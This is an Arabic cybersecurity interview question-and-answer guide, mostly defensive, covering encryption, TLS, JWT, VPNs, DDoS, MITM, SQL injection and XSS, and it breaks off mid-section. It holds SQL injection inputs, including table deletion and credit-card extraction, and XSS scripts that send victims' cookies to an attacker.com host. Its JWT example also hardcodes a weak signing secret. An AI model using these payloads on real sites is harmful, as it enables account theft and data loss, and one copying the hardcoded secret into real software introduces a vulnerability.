# أسئلة مقابلات الأمن السيبراني

## جدول المحتويات
1. [أسئلة عامة](#أسئلة-عامة)
2. [أسئلة تقنية أساسية](#أسئلة-تقنية-أساسية)
3. [أسئلة التشفير](#أسئلة-التشفير)
4. [أسئلة أمن الشبكات](#أسئلة-أمن-الشبكات)
5. [أسئلة أمن التطبيقات](#أسئلة-أمن-التطبيقات)
6. [أسئلة اختبار الاختراق](#أسئلة-اختبار-الاختراق)
7. [أسئلة الأمان السحابي](#أسئلة-الأمان-السحابي)
8. [أسئلة متقدمة وسيناريوهات](#أسئلة-متقدمة-وسيناريوهات)
9. [أسئلة سلوكية](#أسئلة-سلوكية)

---

## أسئلة عامة

### س1: ما هو الأمن السيبراني؟ ولماذا هو مهم؟

**الإجابة:**
الأمن السيبراني هو ممارسة حماية الأنظمة والشبكات والبرامج من الهجمات الرقمية. يهدف إلى حماية البيانات الحساسة من الوصول غير المصرح به أو التعديل أو الإتلاف.

**الأهمية:**
- حماية البيانات الحساسة والمعلومات الشخصية
- الحفاظ على سمعة المؤسسة وثقة العملاء
- الامتثال للمتطلبات القانونية والتنظيمية
- منع الخسائر المالية والتشغيلية
- ضمان استمرارية الأعمال

---

### س2: ما هي CIA Triad؟ اشرح كل مكون.

**الإجابة:**
CIA Triad هي ثلاثة مبادئ أساسية للأمن السيبراني:

**1. السرية (Confidentiality):**
- ضمان أن المعلومات متاحة فقط للأشخاص المصرح لهم
- التقنيات: التشفير، التحكم في الوصول، المصادقة
- مثال: استخدام كلمات مرور قوية

**2. السلامة (Integrity):**
- ضمان دقة واكتمال البيانات ومنع التعديل غير المصرح به
- التقنيات: الهاشينج، التوقيعات الرقمية، التحكم في الإصدارات
- مثال: التحقق من checksum للملفات المحملة

**3. التوفر (Availability):**
- ضمان وصول المستخدمين المصرح لهم للموارد عند الحاجة
- التقنيات: النسخ الاحتياطي، التكرار، الحماية من DDoS
- مثال: استخدام Load Balancers

---

### س3: ما الفرق بين Threat، Vulnerability، و Risk؟

**الإجابة:**

**Threat (التهديد):**
- أي شيء لديه القدرة على إلحاق الضرر بالنظام
- مثال: هجوم DDoS، برمجيات خبيثة، مهاجم خارجي

**Vulnerability (الثغرة):**
- نقطة ضعف في النظام يمكن استغلالها
- مثال: نظام غير محدث، كلمة مرور ضعيفة، تكوين خاطئ

**Risk (المخاطرة):**
- احتمالية استغلال ثغرة من قبل تهديد
- الصيغة: `Risk = Threat × Vulnerability × Impact`

**مثال توضيحي:**
```
Threat: مهاجم يحاول اختراق النظام
Vulnerability: خادم ويب يحتوي على ثغرة SQL Injection
Risk: احتمالية سرقة بيانات العملاء من قاعدة البيانات
```

---

### س4: ما الفرق بين IDS و IPS؟

**الإجابة:**

**IDS (Intrusion Detection System):**
- **الوظيفة:** كشف التهديدات والهجمات
- **الإجراء:** يرسل تنبيهات للمسؤولين
- **الوضع:** Passive (سلبي)
- **الموقع:** خارج مسار الشبكة (Out-of-band)
- **التأثير:** لا يوقف الهجمات، فقط يكتشفها

**IPS (Intrusion Prevention System):**
- **الوظيفة:** كشف ومنع التهديدات
- **الإجراء:** يحجب حركة المرور الضارة تلقائياً
- **الوضع:** Active (نشط)
- **الموقع:** في مسار الشبكة (In-line)
- **التأثير:** يمكن أن يسبب إيجابيات كاذبة تعطل الخدمة

**الفرق الرئيسي:**
```
IDS = كاميرا المراقبة (تراقب وتنبه)
IPS = حارس الأمن (يراقب ويتدخل)
```

---

### س5: ما هي أنواع Firewalls؟

**الإجابة:**

**1. Packet Filtering Firewall:**
- يفحص رؤوس الحزم (IP address, Port, Protocol)
- سريع لكن محدود
- لا يفهم محتوى التطبيق

**2. Stateful Inspection Firewall:**
- يتتبع حالة الاتصالات النشطة
- يتذكر الجلسات
- أكثر أماناً من Packet Filtering

**3. Application Layer Firewall (WAF):**
- يفحص محتوى التطبيق
- يفهم بروتوكولات HTTP, FTP, SMTP
- يحمي من SQL Injection, XSS

**4. Next-Generation Firewall (NGFW):**
- يجمع جميع المزايا السابقة
- Deep Packet Inspection
- IPS/IDS متكامل
- Application Awareness
- SSL Inspection

**5. Proxy Firewall:**
- يعمل كوسيط بين العميل والخادم
- يخفي عنوان IP الحقيقي
- يمكنه تصفية المحتوى

---

## أسئلة تقنية أساسية

### س6: ما هي المصادقة الثنائية (2FA/MFA)؟ وما أنواعها؟

**الإجابة:**
المصادقة الثنائية (Two-Factor Authentication) هي طبقة أمان إضافية تتطلب عاملين أو أكثر للتحقق من الهوية.

**عوامل المصادقة:**

**1. Something You Know (شيء تعرفه):**
```
- كلمات المرور
- أرقام PIN
- أسئلة الأمان
```

**2. Something You Have (شيء تمتلكه):**
```
- الهاتف المحمول (OTP)
- البطاقات الذكية
- مفاتيح الأمان (YubiKey)
```

**3. Something You Are (شيء أنت عليه):**
```
- بصمة الإصبع
- مسح شبكية العين
- التعرف على الوجه
- التعرف على الصوت
```

**4. Somewhere You Are (مكانك):**
```
- GPS location
- IP address range
```

**5. Something You Do (شيء تفعله):**
```
- نمط الكتابة
- التوقيع
```

**مثال عملي:**
```
تسجيل الدخول = كلمة مرور (Know) + OTP من الهاتف (Have)
```

---

### س7: اشرح الفرق بين Encoding و Encryption و Hashing.

**الإجابة:**

**1. Encoding (الترميز):**
```
- الغرض: تحويل البيانات لصيغة مختلفة للتوافق
- هل هو آمن؟ لا - يمكن فكه بسهولة
- عكسي؟ نعم
- مثال: Base64, URL Encoding, ASCII
- الاستخدام: نقل البيانات، ليس للأمان

مثال:
"Hello" → Base64 → "SGVsbG8="
```

**2. Encryption (التشفير):**
```
- الغرض: حماية السرية
- هل هو آمن؟ نعم - يحتاج مفتاح لفكه
- عكسي؟ نعم بالمفتاح
- مثال: AES, RSA, DES
- الاستخدام: حماية البيانات الحساسة

مثال:
"Hello" + Key → AES → "x8f2k9d..."
```

**3. Hashing (الهاشينج):**
```
- الغرض: التحقق من السلامة
- هل هو آمن؟ نعم - لا يمكن عكسه
- عكسي؟ لا (one-way)
- مثال: SHA-256, MD5, bcrypt
- الاستخدام: تخزين كلمات المرور، التحقق من الملفات

مثال:
"Hello" → SHA-256 → "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969"
```

**جدول المقارنة:**
```
┌────────────┬──────────┬────────┬─────────────┐
│            │ Encoding │ Encrypt│  Hashing    │
├────────────┼──────────┼────────┼─────────────┤
│ Reversible │   Yes    │  Yes   │     No      │
│ Key needed │   No     │  Yes   │     No      │
│ Security   │   No     │  Yes   │     Yes     │
│ Use case   │ Transfer │ Protect│ Integrity   │
└────────────┴──────────┴────────┴─────────────┘
```

---

### س8: ما الفرق بين Symmetric و Asymmetric Encryption؟

**الإجابة:**

**Symmetric Encryption (التشفير المتماثل):**
```
✓ نفس المفتاح للتشفير وفك التشفير
✓ سريع وفعال
✓ مناسب لكميات كبيرة من البيانات
✗ مشكلة توزيع المفتاح
✗ إذا تم اختراق المفتاح، يتم اختراق كل شيء

الخوارزميات: AES, DES, 3DES, Blowfish

مثال:
Alice ──[Key]──> Encrypt ──[Ciphertext]──> Decrypt <──[Same Key]── Bob
```

**Asymmetric Encryption (التشفير غير المتماثل):**
```
✓ مفتاحين: عام (Public) وخاص (Private)
✓ حل مشكلة توزيع المفتاح
✓ يدعم التوقيعات الرقمية
✗ بطيء مقارنة بالمتماثل
✗ غير مناسب لكميات كبيرة

الخوارزميات: RSA, ECC, DSA

مثال:
Alice ──[Bob's Public Key]──> Encrypt ──> Decrypt <──[Bob's Private Key]── Bob
```

**الاستخدام الهجين (Hybrid):**
```
1. استخدام Asymmetric لتبادل مفتاح Symmetric
2. استخدام Symmetric لتشفير البيانات الفعلية

مثال: HTTPS/TLS
- RSA لتبادل مفتاح الجلسة
- AES لتشفير البيانات
```

---

### س9: ما هو Salt في سياق تخزين كلمات المرور؟

**الإجابة:**
Salt هو قيمة عشوائية تُضاف إلى كلمة المرور قبل تطبيق دالة الهاش.

**بدون Salt:**
```java
password = "123456"
hash = SHA256(password)
// النتيجة دائماً نفسها: "8d969eef6..."

المشكلة:
- نفس كلمة المرور = نفس الهاش
- عرضة لهجمات Rainbow Tables
- يمكن معرفة المستخدمين الذين يستخدمون نفس كلمة المرور
```

**مع Salt:**
```java
password = "123456"
salt = generateRandomSalt() // "x8f2k9d..."
hash = SHA256(password + salt)
// النتيجة مختلفة في كل مرة

المزايا:
- نفس كلمة المرور تنتج هاشات مختلفة
- يمنع هجمات Rainbow Tables
- يجب كسر كل هاش على حدة
```

**مثال عملي في Java:**
```java
import org.springframework.security.crypto.bcrypt.BCrypt;

public class PasswordExample {

    // bcrypt يضيف salt تلقائياً
    public static String hashPassword(String password) {
        return BCrypt.hashpw(password, BCrypt.gensalt(12));
    }

    public static boolean verifyPassword(String password, String hash) {
        return BCrypt.checkpw(password, hash);
    }

    public static void main(String[] args) {
        String password = "myPassword123";

        // نفس كلمة المرور، هاشات مختلفة
        String hash1 = hashPassword(password);
        String hash2 = hashPassword(password);

        System.out.println(hash1); // $2a$12$xyz...
        System.out.println(hash2); // $2a$12$abc...
        // مختلفان!

        System.out.println(verifyPassword(password, hash1)); // true
        System.out.println(verifyPassword(password, hash2)); // true
    }
}
```

---

### س10: ما هو Rainbow Table Attack؟ وكيف يمكن منعه؟

**الإجابة:**

**Rainbow Table Attack:**
هو هجوم يستخدم جداول محسوبة مسبقاً تحتوي على كلمات المرور الشائعة وهاشاتها.

**كيف يعمل:**
```
1. المهاجم يحصل على ملف الهاشات
2. يبحث عن الهاش في Rainbow Table
3. يجد كلمة المرور الأصلية

مثال:
Hash: "5f4dcc3b5aa765d61d8327deb882cf99"
Rainbow Table → يجد → Password: "password"
```

**طرق المنع:**

**1. استخدام Salt:**
```java
// بدلاً من:
hash = MD5("password")  // نفس النتيجة دائماً

// استخدم:
salt = randomSalt()
hash = MD5("password" + salt)  // نتيجة مختلفة في كل مرة
```

**2. استخدام خوارزميات بطيئة:**
```java
// bcrypt, scrypt, argon2 مصممة لتكون بطيئة
String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
// الـ 12 هي cost factor - كلما زادت، أصبح أبطأ وأكثر أماناً
```

**3. استخدام Pepper (اختياري):**
```java
// Pepper = secret key إضافي يُخزن بشكل منفصل
String pepper = getFromConfig(); // لا يُخزن مع الهاش
String hash = SHA256(password + salt + pepper);
```

---

## أسئلة التشفير

### س11: ما هو SSL/TLS؟ واشرح عملية TLS Handshake.

**الإجابة:**

**SSL/TLS:**
- SSL (Secure Sockets Layer) - قديم وغير آمن
- TLS (Transport Layer Security) - الإصدار الحديث
- بروتوكول يؤمن الاتصال بين العميل والخادم

**TLS Handshake - الخطوات:**

```
Client                                    Server
  │                                          │
  │──1. ClientHello ────────────────────────>│
  │    (TLS version, Cipher suites,          │
  │     Random number)                       │
  │                                          │
  │<──2. ServerHello ────────────────────────│
  │    (Chosen cipher, Random number,        │
  │     Certificate, Server Key Exchange)    │
  │                                          │
  │──3. Client Key Exchange ─────────────────>│
  │    (Pre-master secret encrypted          │
  │     with server's public key)            │
  │                                          │
  │──4. Change Cipher Spec ──────────────────>│
  │    (Switch to encrypted communication)    │
  │                                          │
  │──5. Finished ────────────────────────────>│
  │    (Encrypted confirmation)              │
  │                                          │
  │<──6. Change Cipher Spec ─────────────────│
  │<──7. Finished ───────────────────────────│
  │                                          │
  │═══════ Encrypted Communication ══════════│
```

**الشرح التفصيلي:**

**1. ClientHello:**
```
العميل يرسل:
- إصدارات TLS المدعومة
- قائمة Cipher Suites
- رقم عشوائي (Client Random)
```

**2. ServerHello:**
```
الخادم يرسل:
- إصدار TLS المختار
- Cipher Suite المختار
- رقم عشوائي (Server Random)
- الشهادة الرقمية (Certificate)
```

**3. Certificate Verification:**
```
العميل يتحقق من:
- صحة الشهادة
- تاريخ الصلاحية
- اسم النطاق
- الجهة المصدرة (CA)
```

**4. Key Exchange:**
```
- العميل ينشئ Pre-master Secret
- يشفره بالمفتاح العام من شهادة الخادم
- يرسله للخادم
- الطرفان يستخدمانه لتوليد Session Keys
```

**5. Finished Messages:**
```
- كلا الطرفين يرسل رسالة مشفرة للتأكيد
- إذا فك كل طرف رسالة الآخر بنجاح، الاتصال آمن
```

---

### س12: ما الفرق بين HTTP و HTTPS؟

**الإجابة:**

**HTTP (Hypertext Transfer Protocol):**
```
✗ غير مشفر (Plain text)
✗ البيانات معرضة للاعتراض
✗ لا يوجد تحقق من الهوية
✗ عرضة لهجمات MITM
Port: 80
```

**HTTPS (HTTP Secure):**
```
✓ مشفر باستخدام TLS/SSL
✓ البيانات محمية من الاعتراض
✓ التحقق من هوية الخادم عبر الشهادات
✓ يضمن السلامة والسرية
Port: 443
```

**جدول المقارنة:**
```
┌──────────────────┬─────────┬─────────┐
│                  │  HTTP   │ HTTPS   │
├──────────────────┼─────────┼─────────┤
│ Encryption       │   No    │   Yes   │
│ Certificate      │   No    │   Yes   │
│ Port             │   80    │   443   │
│ Security         │   Low   │   High  │
│ SEO Ranking      │   Lower │  Higher │
│ Trust            │   Low   │   High  │
└──────────────────┴─────────┴─────────┘
```

**كيفية التحقق من HTTPS:**
```
✓ القفل في شريط العنوان
✓ الشهادة صالحة
✓ اسم النطاق يطابق الشهادة
✓ الشهادة صادرة من CA موثوقة
```

---

### س13: ما هو Certificate Pinning؟

**الإجابة:**
Certificate Pinning هو تقنية أمان تربط التطبيق بشهادة محددة أو مفتاح عام، بدلاً من الوثوق بأي شهادة صادرة من CA.

**المشكلة التي يحلها:**
```
في HTTPS العادي:
- التطبيق يثق في أي CA موثوقة من النظام
- إذا تم اختراق CA، يمكن إصدار شهادة مزيفة
- هجوم MITM محتمل حتى مع HTTPS
```

**كيف يعمل Certificate Pinning:**
```
1. المطور يحدد الشهادة أو المفتاح العام المتوقع
2. يضمنه في التطبيق
3. عند الاتصال، التطبيق يتحقق من مطابقة الشهادة
4. إذا لم تتطابق، يرفض الاتصال حتى لو كانت الشهادة صالحة
```

**مثال في Android:**
```xml
<!-- network_security_config.xml -->
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">example.com</domain>
        <pin-set>
            <pin digest="SHA-256">
                7HIpactkIAq2Y49orFOOQKurWxmmSFZhBCoQYcRhJ3Y=
            </pin>
            <!-- backup pin -->
            <pin digest="SHA-256">
                fwza0LRMXouZHRC8Ei+4PyuldPDcf3UKgO/04cDM1oE=
            </pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

**مثال في Java/Spring Boot:**
```java
import javax.net.ssl.*;
import java.security.cert.Certificate;

public class CertificatePinner {

    private static final String EXPECTED_PIN = "sha256/AAAAAAAAAAAAAAAAAAAAAA==";

    public void pinCertificate(HttpsURLConnection connection) throws Exception {
        connection.setSSLSocketFactory(createPinnedSSLSocketFactory());
    }

    private SSLSocketFactory createPinnedSSLSocketFactory() {
        // تنفيذ منطق Certificate Pinning
        // ...
    }
}
```

**المزايا:**
```
✓ حماية إضافية ضد MITM
✓ عدم الاعتماد الكامل على CAs
✓ حماية من اختراق CAs
```

**العيوب:**
```
✗ صعوبة التحديث (يتطلب تحديث التطبيق)
✗ إذا انتهت الشهادة دون تحديث، التطبيق يتعطل
✗ يحتاج Backup pins
```

---

### س14: ما هو JWT؟ وما مكوناته؟

**الإجابة:**
JWT (JSON Web Token) هو معيار مفتوح (RFC 7519) لنقل المعلومات بشكل آمن بين الأطراف على شكل JSON object موقع رقمياً.

**مكونات JWT:**
```
xxxxx.yyyyy.zzzzz
  │     │     │
Header Payload Signature
```

**1. Header (الرأس):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
يحتوي على:
- نوع التوكن (JWT)
- خوارزمية التوقيع (HS256, RS256, etc.)

**2. Payload (الحمولة):**
```json
{
  "sub": "1234567890",
  "name": "Ahmed Ali",
  "email": "ahmed@example.com",
  "role": "ADMIN",
  "iat": 1516239022,
  "exp": 1516242622
}
```
يحتوي على Claims:
- **Registered Claims**: iss, exp, sub, aud
- **Public Claims**: مخصصة حسب الحاجة
- **Private Claims**: خاصة بالتطبيق

**3. Signature (التوقيع):**
```javascript
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**مثال JWT كامل:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFobWVkIEFsaSIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**مثال في Spring Boot:**
```java
import io.jsonwebtoken.*;
import java.util.Date;

@Service
public class JwtService {

    private final String SECRET_KEY = "mySecretKey";
    private final long EXPIRATION_TIME = 86400000; // 24 hours

    public String generateToken(String username) {
        return Jwts.builder()
                .setSubject(username)
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + EXPIRATION_TIME))
                .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
                .compact();
    }

    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                .setSigningKey(SECRET_KEY)
                .parseClaimsJws(token);
            return true;
        } catch (JwtException e) {
            return false;
        }
    }

    public String getUsernameFromToken(String token) {
        Claims claims = Jwts.parser()
                .setSigningKey(SECRET_KEY)
                .parseClaimsJws(token)
                .getBody();
        return claims.getSubject();
    }
}
```

**المزايا:**
```
✓ Stateless - لا يحتاج session على الخادم
✓ Self-contained - يحتوي على جميع المعلومات
✓ Compact - حجم صغير
✓ يعمل مع Mobile Apps و SPAs
```

**العيوب:**
```
✗ لا يمكن إبطاله بسهولة
✗ حجم أكبر من Session ID
✗ يجب حمايته من XSS
```

---

## أسئلة أمن الشبكات

### س15: ما هو VPN؟ وما أنواعه؟

**الإجابة:**
VPN (Virtual Private Network) هو تقنية تنشئ اتصالاً آمناً ومشفراً عبر شبكة أقل أماناً (مثل الإنترنت).

**كيف يعمل:**
```
User Device ──[Encrypted Tunnel]──> VPN Server ──> Internet
                                          │
                                    Decryption
                                          │
                                    Destination
```

**أنواع VPN:**

**1. Remote Access VPN:**
```
- يربط المستخدمين الفرديين بالشبكة الخاصة
- للعمل عن بعد
- البروتوكولات: OpenVPN, L2TP/IPSec, PPTP

مثال:
موظف في المنزل ──> VPN ──> شبكة الشركة
```

**2. Site-to-Site VPN:**
```
- يربط شبكتين كاملتين
- لربط فروع الشركة
- البروتوكول: IPSec

مثال:
المكتب الرئيسي ──> VPN ──> الفرع
```

**3. SSL/TLS VPN:**
```
- يعمل عبر المتصفح
- لا يحتاج تثبيت برامج
- سهل الاستخدام

مثال:
متصفح الويب ──> HTTPS ──> VPN Gateway
```

**بروتوكولات VPN:**

**أ. PPTP (Point-to-Point Tunneling Protocol):**
```
✓ سريع
✓ سهل الإعداد
✗ غير آمن (ضعيف في التشفير)
✗ لا يُنصح به
```

**ب. L2TP/IPSec:**
```
✓ أكثر أماناً من PPTP
✓ مدعوم من معظم الأجهزة
✗ أبطأ بسبب التشفير المزدوج
```

**ج. OpenVPN:**
```
✓ مفتوح المصدر
✓ آمن جداً
✓ يعمل على معظم المنصات
✗ يحتاج تثبيت برنامج
```

**د. IKEv2/IPSec:**
```
✓ سريع ومستقر
✓ ممتاز للأجهزة المحمولة
✓ إعادة الاتصال التلقائي
```

**هـ. WireGuard:**
```
✓ حديث وسريع جداً
✓ كود مصدر صغير (سهل التدقيق)
✓ أداء ممتاز
```

**الفوائد:**
```
✓ الخصوصية والأمان
✓ إخفاء عنوان IP
✓ الوصول للمحتوى المحجوب
✓ حماية على الشبكات العامة
```

---

### س16: ما هو DDoS Attack؟ وكيف يمكن منعه؟

**الإجابة:**
DDoS (Distributed Denial of Service) هو هجوم يستهدف جعل الخدمة غير متاحة عن طريق إغراقها بحركة مرور هائلة من مصادر متعددة.

**الفرق بين DoS و DDoS:**
```
DoS (Denial of Service):
- هجوم من مصدر واحد
- أسهل في الكشف والحجب

DDoS (Distributed DoS):
- هجوم من آلاف المصادر (Botnet)
- صعب الحجب لأن المصادر كثيرة ومتنوعة
```

**أنواع هجمات DDoS:**

**1. Volume-Based Attacks (هجمات الحجم):**
```
الهدف: استهلاك النطاق الترددي

UDP Flood:
- إرسال حزم UDP بكميات هائلة
- الخادم يهدر موارده في معالجتها

ICMP Flood (Ping Flood):
- إرسال طلبات ping بكميات ضخمة

القياس: Bits per second (Bps)
```

**2. Protocol Attacks (هجمات البروتوكول):**
```
الهدف: استهلاك موارد الخادم أو الأجهزة الوسيطة

SYN Flood:
Client ──SYN──> Server
Client <─SYN/ACK── Server
(لا يرسل ACK، يترك الاتصال نصف مفتوح)
Server يبقى في انتظار...

Ping of Death:
- إرسال حزم ping بحجم أكبر من المسموح

القياس: Packets per second (Pps)
```

**3. Application Layer Attacks (هجمات طبقة التطبيق):**
```
الهدف: استهلاك موارد التطبيق

HTTP Flood:
- طلبات HTTP شرعية لكن بكميات ضخمة
- يستهدف صفحات تستهلك موارد كثيرة

Slowloris:
- فتح اتصالات متعددة
- إرسال HTTP headers ببطء شديد
- إبقاء الاتصالات مفتوحة لأطول فترة

القياس: Requests per second (Rps)
```

**طرق الحماية من DDoS:**

**1. Network Level Protection:**
```bash
# Firewall Rules
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT

# Rate Limiting
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
```

**2. Application Level Protection:**
```java
// في Spring Boot
@Configuration
public class RateLimitConfig {

    @Bean
    public RateLimiter rateLimiter() {
        return RateLimiter.create(100.0); // 100 requests per second
    }
}

@RestController
public class ApiController {

    @Autowired
    private RateLimiter rateLimiter;

    @GetMapping("/api/data")
    public ResponseEntity<?> getData() {
        if (!rateLimiter.tryAcquire()) {
            return ResponseEntity.status(429).body("Too Many Requests");
        }
        // Process request
        return ResponseEntity.ok(data);
    }
}
```

**3. CDN و WAF:**
```
- Cloudflare
- Akamai
- AWS Shield
- Azure DDoS Protection

المزايا:
✓ يوزع الحركة عبر خوادم متعددة
✓ يكتشف الأنماط غير الطبيعية
✓ يحجب IPs المشبوهة تلقائياً
```

**4. Techniques:**
```
- Traffic Analysis: تحليل الأنماط
- IP Blacklisting: حجب IPs المشبوهة
- Geo-blocking: حجب دول معينة
- CAPTCHA: للتحقق من أنه إنسان
- Load Balancing: توزيع الحمل
- Overprovisioning: موارد إضافية
```

---

### س17: ما هو Man-in-the-Middle (MITM) Attack؟ وكيف يمكن منعه؟

**الإجابة:**
MITM هو هجوم يعترض فيه المهاجم الاتصال بين طرفين ويتنصت أو يعدل البيانات المتبادلة.

**كيف يعمل:**
```
Normal Communication:
Alice ←──────────────→ Bob

MITM Attack:
Alice ←────→ Attacker ←────→ Bob
              (يقرأ ويعدل)
```

**أنواع MITM Attacks:**

**1. ARP Spoofing:**
```
- المهاجم يرسل ARP responses مزيفة
- يقنع الضحية أن MAC address للخادم هو MAC address المهاجم
- كل البيانات تمر عبر المهاجم

الهجوم:
Victim: من هو 192.168.1.1?
Attacker: أنا! MAC address الخاص بي هو XX:XX:XX:XX:XX:XX
Victim: (يرسل البيانات للمهاجم بدلاً من Gateway)
```

**2. DNS Spoofing:**
```
- المهاجم يعيد توجيه DNS queries
- يرسل الضحية لموقع مزيف

الهجوم:
Victim: ما هو IP لـ bank.com?
Attacker: 192.168.1.100 (موقع مزيف)
Victim: (يدخل بياناته في الموقع المزيف)
```

**3. SSL Stripping:**
```
- المهاجم يحول HTTPS إلى HTTP
- يجعل الاتصال غير مشفر

الهجوم:
Victim ──HTTPS──> Attacker ──HTTP──> Server
(Attacker يرى البيانات بدون تشفير)
```

**4. Wi-Fi Eavesdropping:**
```
- إنشاء نقطة وصول Wi-Fi مزيفة
- الضحية يتصل بالشبكة المزيفة
- المهاجم يرى كل الحركة

مثال:
"Free Wi-Fi" في المقهى
```

**طرق الحماية:**

**1. استخدام HTTPS:**
```
✓ يشفر البيانات
✓ يحقق من هوية الخادم
✓ يكتشف التعديل على البيانات

التحقق:
- القفل في شريط العنوان
- الشهادة صالحة
```

**2. Certificate Pinning:**
```java
// ربط التطبيق بشهادة محددة
public void pinCertificate() {
    CertificatePinner certificatePinner = new CertificatePinner.Builder()
        .add("example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAA==")
        .build();

    OkHttpClient client = new OkHttpClient.Builder()
        .certificatePinner(certificatePinner)
        .build();
}
```

**3. VPN:**
```
✓ يشفر كل البيانات
✓ يخفي حركة المرور من المهاجم المحلي
```

**4. HSTS (HTTP Strict Transport Security):**
```java
// في Spring Security
http.headers()
    .httpStrictTransportSecurity()
    .maxAgeInSeconds(31536000)
    .includeSubDomains(true);
```

**5. تجنب الشبكات العامة:**
```
✗ لا تستخدم Wi-Fi عامة لمعاملات حساسة
✓ استخدم بيانات الهاتف المحمول
✓ إذا اضطررت، استخدم VPN
```

**6. DNS over HTTPS (DoH):**
```
- تشفير DNS queries
- يمنع DNS Spoofing
```

**7. التحقق من الشهادات:**
```
✓ تحقق من صحة الشهادة
✓ تحقق من اسم النطاق
✓ انتبه لتحذيرات المتصفح
```

---

## أسئلة أمن التطبيقات

### س18: ما هو SQL Injection؟ وكيف يمكن منعه؟

**الإجابة:**
SQL Injection هو ثغرة تسمح للمهاجم بحقن أوامر SQL ضارة في استعلامات قاعدة البيانات.

**مثال على الثغرة:**
```java
// ✗ كود ضعيف
String username = request.getParameter("username");
String password = request.getParameter("password");

String query = "SELECT * FROM users WHERE username = '" + username +
               "' AND password = '" + password + "'";

Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**الهجوم:**
```sql
-- المدخلات:
username: admin' --
password: anything

-- الاستعلام الناتج:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'

-- النتيجة:
-- كل شيء بعد -- يصبح تعليقاً
-- تسجيل دخول بدون كلمة مرور!
```

**أمثلة أخرى على الهجمات:**

**1. استخراج البيانات:**
```sql
-- المدخل:
username: ' OR '1'='1

-- الاستعلام:
SELECT * FROM users WHERE username = '' OR '1'='1'

-- النتيجة: يعيد جميع المستخدمين!
```

**2. حذف البيانات:**
```sql
-- المدخل:
username: '; DROP TABLE users; --

-- الاستعلام:
SELECT * FROM users WHERE username = ''; DROP TABLE users; --'

-- النتيجة: حذف جدول المستخدمين!
```

**3. Union-based Attack:**
```sql
-- المدخل:
id: 1' UNION SELECT credit_card FROM payments --

-- الاستعلام:
SELECT name FROM products WHERE id = '1' UNION SELECT credit_card FROM payments --'

-- النتيجة: استخراج بطاقات الائتمان
```

**طرق الحماية:**

**1. Prepared Statements (الأفضل):**
```java
// ✓ كود آمن
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

**2. في JPA/Hibernate:**
```java
// ✓ Named Parameters
@Query("SELECT u FROM User u WHERE u.username = :username AND u.password = :password")
User findByUsernameAndPassword(@Param("username") String username,
                                @Param("password") String password);

// ✓ Method Query
User findByUsernameAndPassword(String username, String password);
```

**3. Stored Procedures:**
```java
CallableStatement cstmt = connection.prepareCall("{call getUserByCredentials(?, ?)}");
cstmt.setString(1, username);
cstmt.setString(2, password);
ResultSet rs = cstmt.executeQuery();
```

**4. Input Validation:**
```java
// التحقق من صحة المدخلات
public boolean isValidUsername(String username) {
    // فقط أحرف وأرقام، بدون رموز خاصة
    return username.matches("^[a-zA-Z0-9_]{3,20}$");
}

// استخدام Whitelist
public boolean isValidInput(String input, List<String> allowedValues) {
    return allowedValues.contains(input);
}
```

**5. Escaping Special Characters:**
```java
// في حالات نادرة حيث لا يمكن استخدام Prepared Statements
String safeName = StringEscapeUtils.escapeSql(userInput);
```

**6. Least Privilege:**
```sql
-- منح صلاحيات محدودة لحساب قاعدة البيانات
GRANT SELECT, INSERT, UPDATE ON database.users TO 'appuser'@'localhost';
-- لا تمنح DROP, DELETE إلا إذا كان ضرورياً
```

**7. Error Handling:**
```java
// ✗ لا تكشف تفاصيل SQL
try {
    // database operation
} catch (SQLException e) {
    log.error("Database error", e);
    throw new ApplicationException("An error occurred"); // رسالة عامة
}
```

---

### س19: ما هو XSS (Cross-Site Scripting)؟ وما أنواعه؟

**الإجابة:**
XSS هو ثغرة تسمح للمهاجم بحقن سكريبتات ضارة (عادة JavaScript) في صفحات ويب يراها مستخدمون آخرون.

**أنواع XSS:**

**1. Stored XSS (Persistent):**
```
- السكريبت الضار يُخزن في قاعدة البيانات
- يُنفذ في كل مرة يتم عرض الصفحة
- الأخطر

مثال:
1. المهاجم ينشر تعليقاً:
   <script>
     document.location='http://attacker.com/steal?cookie='+document.cookie
   </script>

2. التعليق يُخزن في قاعدة البيانات

3. كل من يشاهد الصفحة، يُسرق الكوكيز الخاص به
```

**2. Reflected XSS (Non-Persistent):**
```
- السكريبت الضار في الطلب (URL, Form)
- يُعكس في الاستجابة
- يحتاج خداع الضحية للنقر على رابط

مثال:
1. المهاجم يرسل رابطاً:
   http://example.com/search?q=<script>alert(document.cookie)</script>

2. الموقع يعرض:
   Search results for: <script>alert(document.cookie)</script>

3. السكريبت يُنفذ في متصفح الضحية
```

**3. DOM-based XSS:**
```
- الثغرة في JavaScript من جانب العميل
- البيانات تُعالج في DOM بدون تنقية

مثال JavaScript ضعيف:
var search = document.location.hash.substring(1);
document.getElementById("results").innerHTML = "You searched for: " + search;

الهجوم:
http://example.com/#<img src=x onerror=alert(document.cookie)>
```

**أمثلة على Payloads:**
```html
<!-- Basic Alert -->
<script>alert('XSS')</script>

<!-- Cookie Stealing -->
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>

<!-- Using Event Handlers -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>

<!-- Bypassing Filters -->
